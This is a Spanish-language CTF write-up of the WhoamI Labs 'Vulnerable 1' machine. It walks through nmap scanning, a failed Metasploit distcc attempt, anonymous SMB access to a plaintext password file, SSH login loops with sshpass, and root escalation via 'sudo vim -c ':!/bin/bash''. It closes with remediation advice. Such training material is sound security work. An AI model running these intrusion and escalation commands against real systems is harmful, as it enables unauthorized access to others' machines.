---
title: "WhoamI Labs - Vulnerable 1"
date: 2026-08-10 21:15:00 +0000
categories: [CTF, WhoamiLabs]
tags: [smb, credential-exposure, ssh, sudo-misconfig, gtfobins, vim]
---

## 📋 Resumen Ejecutivo

El laboratorio "Vulnerable 1" expone una superficie de ataque amplia (17 puertos), pero el vector real resulta ser un **share SMB (`cosmos`) con permisos de escritura/lectura para sesiones anónimas**, que contiene un archivo con credenciales en texto plano. Una de esas credenciales tiene una regla de **sudo mal configurada sobre `/usr/bin/vim`**, permitiendo escalar a root mediante una técnica documentada en GTFOBins.

| Campo | Valor |
|---|---|
| Plataforma | WhoamI Labs |
| Dificultad | Fácil |
| IP objetivo | 172.17.0.2 |
| Vulnerabilidad principal | SMB anónimo escribible → Credential Exposure → SSH → Sudo Misconfig (vim) |

![Laboratorio desplegado — objetivo 172.17.0.2](images/01-lab-launch.png)

## 🔍 Reconocimiento

```bash
nmap -sV -sC -p- 172.17.0.2 -oN recon_vuln1.txt
```

Superficie amplia — 17 puertos abiertos, entre ellos:

```
21/tcp   open  ftp         vsftpd 3.0.3        (anónimo permitido)
22/tcp   open  ssh         OpenSSH 7.9p1 Debian
23/tcp   open  tcpwrapped
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.11.5
80/tcp   open  http        Apache 2.4.59 — "Vulnerable 1 | WHOAMI-LABS.COM"
110/tcp  open  pop3        Dovecot
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X-4.X
143/tcp  open  imap        Dovecot
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian
993/tcp  open  ssl/imap    Dovecot
995/tcp  open  ssl/pop3    Dovecot
3306/tcp open  mysql       MariaDB 5.5.5-10.3.39
3632/tcp open  distccd?
5432/tcp open  postgresql  PostgreSQL 11.19-11.22
```

![nmap -sV -sC -p- — 17 puertos abiertos](images/02-nmap-recon.png)

**Priorización:** ante tantos servicios, se descartan primero los de menor probabilidad (mail, bases de datos sin credenciales previas) y se prueban primero los vectores de "bajo esfuerzo / alto impacto": `distccd` (RCE sin autenticación conocido) y los shares SMB.

## 🚫 Vector descartado — distcc

```bash
nmap -p 3632 --script distcc-cve2004-2687 172.17.0.2
msfconsole -q
search distcc
use exploit/unix/misc/distcc_exec
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
check
```

```
[-] 172.17.0.2:3632 - Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer
[-] 172.17.0.2:3632 - Check failed: The state could not be determined.
```

![Fallo de distcc + inicio de enumeración SMB](images/03-distcc-fail-smb-enum.png)

**Nota:** el nmap original marcaba el servicio como `distccd?` (con signo de interrogación — detección heurística, no confirmada). El `check` de Metasploit falla consistentemente con `ECONNRESET`, indicando que el servicio no responde al protocolo esperado. Se descarta esta vía y se pivota a SMB, donde el mismo listado de shares (`smbclient -L`) ya se aprecia en esta captura: aparece el share custom `cosmos`.

## 🕸️ Enumeración SMB — permisos

```bash
nxc smb 172.17.0.2 -u '' -p '' --shares
```

```
Share       Permissions   Remark
-----       -----------   ------
print$                    Printer Drivers
cosmos      READ,WRITE
IPC$                      IPC Service (Samba 4.9.5-Debian)
```

![NetExec confirma permisos READ,WRITE en el share cosmos con sesión nula](images/04-netexec-shares-permissions.png)

**Hallazgo crítico:** el share `cosmos` permite lectura **y escritura** con sesión anónima (`Null Auth: True`), además de `signing:False` como configuración insegura adicional.

## 🔑 Exposición de Credenciales

```bash
smbclient //172.17.0.2/cosmos -N
smb: \> ls
smb: \> get passwords.txt
smb: \> exit
```

![Descarga de passwords.txt vía SMB anónimo](images/05-smbclient-cosmos-get.png)

```bash
cat passwords.txt
```

```
athena:cosmo
seiya:pegasus
hades:underworld
```

![Contenido de passwords.txt — credenciales en texto plano](images/06-passwords-txt-content.png)

**Nota temática:** los usuarios (`athena`, `seiya`, `hades`) y el nombre del share (`cosmos`) son referencias a Saint Seiya / Los Caballeros del Zodiaco.

## 🔓 Validación de credenciales vía SSH

```bash
for user in athena seiya hades; do
  case $user in
    athena) pass="cosmo" ;;
    seiya) pass="pegasus" ;;
    hades) pass="underworld" ;;
  esac
  echo "--- Probando $user:$pass ---"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@172.17.0.2 "whoami" 2>&1
done
```

![Prueba dirigida de las tres credenciales vía SSH — las tres válidas](images/07-ssh-bruteforce-loop.png)

**Resultado:** las tres credenciales son válidas — a diferencia de otros laboratorios donde solo una credencial de la lista funcionaba, aquí los tres usuarios tienen acceso legítimo por SSH.

## 🧭 Selección de usuario — comparación de privilegios

```bash
for user in athena seiya hades; do
  case $user in
    athena) pass="cosmo" ;;
    seiya) pass="pegasus" ;;
    hades) pass="underworld" ;;
  esac
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@172.17.0.2 "id; sudo -l 2>&1"
done
```

```
--- athena ---
uid=1018(athena) gid=1018(athena) groups=1018(athena)
sudo: no tty present and no askpass program specified

--- seiya ---
uid=1000(seiya) gid=1000(seiya) groups=1000(seiya)
User seiya may run the following commands on vulnerable1:
    (ALL) NOPASSWD: /usr/bin/vim

--- hades ---
uid=1020(hades) gid=1020(hades) groups=1020(hades)
sudo: no tty present and no askpass program specified
```

![Comparación de id y sudo -l para los tres usuarios](images/08-sudo-l-comparison.png)

**Hallazgo:** solo `seiya` tiene una entrada de sudo configurada — `NOPASSWD: /usr/bin/vim`. Este es el usuario diseñado para la ruta de escalada.

## 🔑 Sesión interactiva SSH

```bash
sshpass -p "pegasus" ssh -o StrictHostKeyChecking=no seiya@172.17.0.2
```

![Login SSH interactivo exitoso como seiya](images/09-ssh-login-seiya.png)

## ⬆️ Escalada de Privilegios — GTFOBins (vim)

```bash
sudo vim -c ':!/bin/bash' -c ':q'
whoami
id
find / -iname "flag*" 2>/dev/null
```

**Desglose:** `vim` puede ejecutar comandos de shell desde su modo Ex mediante `:!comando`. Como `sudo` permite correr `vim` como root sin contraseña, el `/bin/bash` invocado desde dentro de vim hereda esos privilegios — técnica catalogada en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo).

```
root
uid=0(root) gid=0(root) groups=0(root)
...
/root/flag.txt
```

![Escalada exitosa, confirmación de root, y localización de la flag](images/10-sudo-vim-privesc.png)

## 🚩 Lectura de la flag

```bash
cat /root/flag.txt
```

```
FLAG{4th3n4_pr0t3ct5_th3_s4nctuary_0f_vuln3r4b1l1ty}
```

![Flag capturada como root](images/11-flag-capture.png)

## ✅ Validación en la plataforma

![Laboratorio completado — flag validada por WhoamI Labs](images/12-lab-completed-validation.png)

## 📊 Cadena de Explotación (Kill Chain)

```
Recon (nmap, 17 puertos)
   → Descarte de distcc (conexión inestable, sin confirmar)
   → Enumeración SMB (smbclient -L)
   → Confirmación de permisos READ,WRITE en share "cosmos" (NetExec)
   → Descarga de passwords.txt vía SMB anónimo
   → Credenciales en texto plano (3 pares usuario:password)
   → Validación de las 3 credenciales vía SSH (todas válidas)
   → Comparación de privilegios (id + sudo -l) → seiya con NOPASSWD en vim
   → Escalada vía GTFOBins (sudo vim -c ':!/bin/bash')
   → Shell root
   → Flag
```

## 🛡️ Recomendaciones de Remediación

1. **Permisos de share SMB:** el share `cosmos` no debería permitir escritura (ni lectura, idealmente) con sesión anónima; restringir `guest ok = no` y aplicar ACLs adecuadas.
2. **Exposición de credenciales:** nunca almacenar credenciales en texto plano en ubicaciones accesibles sin autenticación fuerte.
3. **Message signing SMB:** habilitar `server signing = mandatory` para mitigar ataques de relay/tampering (actualmente `disabled`).
4. **Sudo Misconfiguration:** eliminar `NOPASSWD` sobre binarios con capacidad de ejecución de shell (`vim`, `less`, `find`, etc. — catalogados en GTFOBins); si se requiere sudo sobre `vim`, restringir mediante `Cmnd_Alias` a archivos específicos y deshabilitar el modo shell.
5. **Reutilización de contraseñas:** aunque no se explotó directamente aquí, las tres credenciales funcionando en SSH sugiere políticas débiles de gestión de contraseñas en el sistema.

## 🧠 Lecciones aprendidas

- Ante una superficie de ataque amplia, priorizar por "bajo esfuerzo / alto impacto" (RCE sin auth conocidos) antes de enumerar exhaustivamente todos los servicios — aunque en este caso el primer candidato (`distcc`) no funcionó, descartarlo rápido permitió pivotar sin perder mucho tiempo.
- Un signo de interrogación en la detección de servicio de nmap (`distccd?`) es una señal de que la identificación es heurística, no confirmada — vale la pena verificar con herramientas dedicadas antes de invertir tiempo en ese vector.
- Cuando varias credenciales encontradas resultan válidas, comparar privilegios (`id`, `sudo -l`) de cada una antes de profundizar identifica rápidamente cuál es la ruta "diseñada" de escalada, evitando explorar a ciegas con el usuario equivocado.
- GTFOBins sigue siendo la referencia obligada para escalada de privilegios vía sudo — `vim`, igual que `find` en laboratorios anteriores, es un binario aparentemente inocuo con capacidad de ejecución de shell que lo convierte en vector de privesc cuando se le otorga sudo sin restricciones.
